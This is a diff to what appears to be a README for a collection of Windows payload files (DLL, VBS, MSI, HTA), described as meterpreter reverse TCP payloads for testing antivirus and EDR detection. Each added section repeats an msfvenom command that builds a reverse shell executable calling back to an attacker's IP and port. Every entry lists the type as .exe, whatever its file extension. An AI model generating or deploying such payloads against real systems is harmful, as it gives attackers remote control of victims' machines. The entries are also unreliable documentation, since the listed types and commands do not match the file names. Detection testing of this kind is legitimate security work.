@@ -74,7 +74,58 @@ Replace `<Your_IP>` with the attacker's IP address and `<Your_Port>` with the de
 
 ---
 
-### `Payload5.exe`
+### `Payload.dll`
+- **Description**: A reverse TCP payload designed for testing AV and EDR detection.
+- **Architecture**: 64-bit Windows
+- **Type**: Executable (`.exe`)
+
+---
+
+## Generation Command
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -o Payload1.exe
+```
+
+Replace `<Your_IP>` with the attacker's IP address and `<Your_Port>` with the desired port for the reverse connection.
+
+---
+
+### `Payload.vbs`
+- **Description**: A reverse TCP payload designed for testing AV and EDR detection.
+- **Architecture**: 64-bit Windows
+- **Type**: Executable (`.exe`)
+
+---
+
+## Generation Command
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -o Payload1.exe
+```
+
+Replace `<Your_IP>` with the attacker's IP address and `<Your_Port>` with the desired port for the reverse connection.
+
+---
+
+### `Payload.msi`
+- **Description**: A reverse TCP payload designed for testing AV and EDR detection.
+- **Architecture**: 64-bit Windows
+- **Type**: Executable (`.exe`)
+
+---
+
+## Generation Command
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -o Payload1.exe
+```
+
+Replace `<Your_IP>` with the attacker's IP address and `<Your_Port>` with the desired port for the reverse connection.
+
+---
+
+### `Payload.hta`
 - **Description**: A reverse TCP payload designed for testing AV and EDR detection.
 - **Architecture**: 64-bit Windows
 - **Type**: Executable (`.exe`)
